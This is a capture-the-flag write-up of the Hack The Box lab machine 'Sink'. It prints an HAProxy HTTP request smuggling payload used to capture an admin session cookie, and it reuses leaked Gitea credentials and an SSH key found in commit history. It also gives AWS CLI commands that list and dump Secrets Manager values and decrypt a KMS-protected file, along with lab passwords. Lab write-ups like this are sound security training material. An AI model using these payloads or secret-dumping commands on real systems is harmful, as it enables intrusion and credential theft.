---
coverY: 0
layout:
  width: default
  cover:
    visible: true
    size: full
    mask: none
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
  anchors:
    visible: true
---

# 🚢 Sink HTB

## Nmap

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>



so we can see we have 2 port so when we go to the 5000 we see a web and on the 3000 its **Gitea**

## Foot Hold&#x20;

so when we login into the web but there was nothing so i saw the request

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

SO IN THIS WE HAVE 2 INFO FIRST WE CAN SEE THE SERVER name AND THE VERSION

and then we can see something new so gone try to find exploit for both of them



```c
Server: gunicorn/20.0.0
Via: haproxy
```

> HAProxy (High Availability Proxy) is a fast, free, and open-source software solution that functions as a high-availability load balancer and proxy server for TCP and HTTP-based applications.
>
> ![](<../.gitbook/assets/image (15).png>)

[https://portswigger.net/daily-swig/haproxy-vulnerability-enables-http-request-smuggling-attacks](https://portswigger.net/daily-swig/haproxy-vulnerability-enables-http-request-smuggling-attacks)

[https://nathandavison.com/blog/haproxy-http-request-smuggling](https://nathandavison.com/blog/haproxy-http-request-smuggling)

```c
POST /comment HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencoded
Content-Length: 249
Connection: keep-alive
Cookie: session=eyJlbWFpbCI6IjAuM0BoYWNrc2VjLmNvbSJ9.aLehcA.LfOL2LNlC0mZyzu3FTtWRgH1UqA
Transfer-Encoding: chunked

4
msg=
0

POST /comment HTTP/1.1
Host: localhost:5000
Content-Type: application/x-www-form-urlencoded
Content-Length: 300
Connection: keep-alive
Cookie: session=eyJlbWFpbCI6IjAuM0BoYWNrc2VjLmNvbSJ9.aLehcA.LfOL2LNlC0mZyzu3FTtWRgH1UqA

msg=
```

this is how it look&#x20;

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

so after this we got admin cookie and we got three passwd

so this how it look so now we are admin so when we go to the notes then we can see there some password that admin have saved so we gone try then on the **Gitea**

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

```c
Dev Node URL : <http://code.sink.htb>
Username : root
Password : FaH@3L>Z3})zzfQ3
```

### &#x20;Initial access

so then with that cred i loged in then in i saw there where 9 commits so i wasted no time and want for them

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

so we got id\_rsa

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

and then

### Shell as David

```c
ssh -i id_rsa marcus@10.10.10.225
```

so we got the user let pwn this now so as we got something in commits so i want to different repo and look for commits i got some commits too

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

so in that we got keys of aws



so we have keys, so to use aws cli we have to give him keys and all info so he can know where are we from

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

so after this we saw some local port and then we tried to look for secrets

```c
aws --endpoint-url="<http://127.0.0.1:4566>" secretsmanager list-secrets
```

so we got list of all secrets , then we got one user david

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

so then i saw david then i looked for david secrets for that i used the cmd blow

```c
aws --endpoint-url="<http://127.0.0.1:4566>" secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-iKfja"
```

so after this we will get the pass of david

### To The Root

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

```c
david@sink.htb\\",\\"password\\":EALB=bcC=`a7f2#k
```

so now we will do some thing from david so now we have to configure again the aws after configuring the aws then we just try to find some new files so we saw some kind encrypted file in david home folder and those files need some kind of keys

so to see all key we can do this

```c
aws --endpoint-url="<http://127.0.0.1:4566/>" kms list-keys
```

so aws use kms to manger servers , so then we listed keys now we will try which one will work

```c
 "KeyId": "0b539917-5eff-45b2-9fa1-e13f0d2c42ac",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/0b539917-5eff-45b2-9fa1-e13f0d2c42ac"
        },
        {
            "KeyId": "16754494-4333-4f77-ad4c-d0b73d799939",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/16754494-4333-4f77-ad4c-d0b73d799939"
        },
        {
            "KeyId": "2378914f-ea22-47af-8b0c-8252ef09cd5f",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/2378914f-ea22-47af-8b0c-8252ef09cd5f"
        },
        {
            "KeyId": "2bf9c582-eed7-482f-bfb6-2e4e7eb88b78",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/2bf9c582-eed7-482f-bfb6-2e4e7eb88b78"
        },
        {
            "KeyId": "53bb45ef-bf96-47b2-a423-74d9b89a297a",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/53bb45ef-bf96-47b2-a423-74d9b89a297a"
        },
        {
            "KeyId": "804125db-bdf1-465a-a058-07fc87c0fad0",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0"
        },
        {
            "KeyId": "837a2f6e-e64c-45bc-a7aa-efa56a550401",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/837a2f6e-e64c-45bc-a7aa-efa56a550401"
        },
        {
            "KeyId": "881df7e3-fb6f-4c7b-9195-7f210e79e525",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/881df7e3-fb6f-4c7b-9195-7f210e79e525"
        },
        {
            "KeyId": "c5217c17-5675-42f7-a6ec-b5aa9b9dbbde",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/c5217c17-5675-42f7-a6ec-b5aa9b9dbbde"
        },
        {
            "KeyId": "f0579746-10c3-4fd1-b2ab-f312a5a0f3fc",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/f0579746-10c3-4fd1-b2ab-f312a5a0f3fc"
        },
        {
            "KeyId": "f2358fef-e813-4c59-87c8-70e50f6d4f70",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/f2358fef-e813-4c59-87c8-70e50f6d4f70"
        }
```

so one by one we saw all keys and this is for encryptionalorithms

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

```c
"KeyMetadata": {
        "AWSAccountId": "000000000000",
        "KeyId": "804125db-bdf1-465a-a058-07fc87c0fad0",
        "Arn": "arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0",
        "CreationDate": 1609757999,
        "Enabled": true,
        "Description": "Encryption and Decryption",
        "KeyUsage": "ENCRYPT_DECRYPT",
        "KeyState": "Enabled",
        "Origin": "AWS_KMS",
        "KeyManager": "CUSTOMER",
        "CustomerMasterKeySpec": "RSA_4096",
        "EncryptionAlgorithms": [
            "RSAES_OAEP_SHA_1",
            "RSAES_OAEP_SHA_256"
```

so then i just want to read some doc and i get to know we can decrypted it with this

[https://awscli.amazonaws.com/v2/documentation/api/2.0.34/reference/kms/decrypt.html#examples](https://awscli.amazonaws.com/v2/documentation/api/2.0.34/reference/kms/decrypt.html#examples)

this is where i found it

so after this

```c
aws --endpoint-url="<http://127.0.0.1:4566/>" kms decrypt --ciphertext-blob fileb://servers.enc --output text --key-id "804125db-bdf1-465a-a058-07fc87c0fad0" --encryption-algorithm RSAES_OAEP_SHA_256
```

**First** we specify the **endpoint Second** we specify the **Key Manager Server Then** the **ciphertext** is used to indicate **which file needs to be decrypted .** After that, for the **output**, we provide the text in which the decrypted data should be written. Next, we give the **Key ID**. Finally, we give the

**type**, which tells the system **which method or format to use** for the operation.

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

```c
H4sIAAAAAAAAAytOLSpLLSrWq8zNYaAVMAACMxMTMA0E6LSBkaExg6GxubmJqbmxqZkxg4GhkYGhAYOCAc1chARKi0sSixQUGIry80vwqSMkP0RBMTj+rbgUFHIyi0tS8xJTUoqsFJSUgAIF+UUlVgoWBkBmRn5xSTFIkYKCrkJyalFJsV5xZl62XkZJElSwLLE0pwQhmJKaBhIoLYaYnZeYm2qlkJiSm5kHMjixuNhKIb40tSqlNFDRNdLU0SMt1YhroINiRIJiaP4vzkynmR2E878hLP+bGALZBoaG5qamo/mfHsCgsY3JUVnT6ra3Ea8jq+qJhVuVUw32RXC+5E7RteNPdm7ff712xavQy6bsqbYZO3alZbyJ22V5nP/XtANG+iunh08t2GdR9vUKk2ON1IfdsSs864IuWBr95xPdoDtL9cA+janZtRmJyt8crn9a5V7e9aXp1BcO7bfCFyZ0v1w6a8vLAw7OG9crNK/RWukXUDTQATEKRsEoGAWjYBSMglEwCkbBKBgFo2AUjIJRMApGwSgYBaNgFIyCUTAKRsEoGAWjYBSMglEwRAEATgL7TAAoAAA=
```

then we got some kind of base64 code so i want to cyberchef and de code it and boom in that we file have admin password

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

hackerman we are in so i tried at web site but ne mean we are admin there already so think maybe it’s for root and i was for root and gg

```c
  name: admin
  pass: _uezduQ!EY5AHfe2
```

ssh hacker man we are in gg

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

So who ever read this till here i know it way to much shit but will do batter if you guys have any kind of suggestion plz let know so i can improve&#x20;

* DC user id 861859120806232065, user name extremeudayyt

<figure><img src="../.gitbook/assets/Proud Of You Yes GIF(1).gif" alt=""><figcaption></figcaption></figure>
